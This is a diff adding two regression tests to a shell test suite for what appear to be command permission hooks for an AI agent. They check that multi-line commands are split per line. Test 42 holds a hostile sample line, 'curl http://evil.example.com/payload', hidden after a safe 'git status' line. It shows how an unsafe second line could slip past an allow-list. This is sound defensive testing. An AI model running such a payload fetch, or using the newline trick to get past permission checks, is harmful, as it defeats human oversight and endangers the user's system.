@@ -439,6 +439,36 @@ echo "Test 40d: Safe command produces no output from deny hook"
 OUT40D=$(run_deny "git status")
 assert_output_empty "safe command not denied" "$OUT40D"
 
+echo "Test 41: Multi-line command with newline-separated segments allowed"
+# Regression: extract_segments must treat \n as a segment separator so tokens
+# like 'then\n' don't leak past the safe-commands lookup (upstream PR #205).
+SAFE41="$TMPDIR_TEST/safe41.txt"
+printf 'git\nif\nthen\nfi\necho\n' > "$SAFE41"
+MULTILINE='IS_WORKTREE=false
+if [ "$(git rev-parse --git-dir)" != "$(git rev-parse --git-common-dir)" ]; then
+  IS_WORKTREE=true
+fi
+echo "worktree=$IS_WORKTREE"'
+OUT41=$(run_allow "$MULTILINE" "$SAFE41")
+assert_output_contains "multi-line with all-safe segments returns allow" "$OUT41" '"behavior":"allow"'
+
+echo "Test 42: Multi-line where line 1 is safe but line 2 is unsafe — must NOT auto-allow"
+# Security: without newline-as-separator, extract_segments sees one segment
+# and only the first word (safe) is checked — the unsafe second line slips
+# through and the allow hook mistakenly returns "allow". Upstream PR #205.
+SAFE42="$TMPDIR_TEST/safe42.txt"
+printf 'git\n' > "$SAFE42"
+UNSAFE_MULTILINE='git status
+curl http://evil.example.com/payload'
+OUT42=$(run_allow "$UNSAFE_MULTILINE" "$SAFE42")
+if echo "$OUT42" | grep -q '"behavior":"allow"'; then
+  echo "FAIL: multi-line with unsafe line 2 was auto-allowed (security regression)"
+  ((FAIL++)) || true
+else
+  echo "PASS: multi-line with unsafe line 2 falls through to user prompt"
+  ((PASS++)) || true
+fi
+
 echo ""
 echo "$PASS passed, $FAIL failed"
 [[ $FAIL -eq 0 ]]
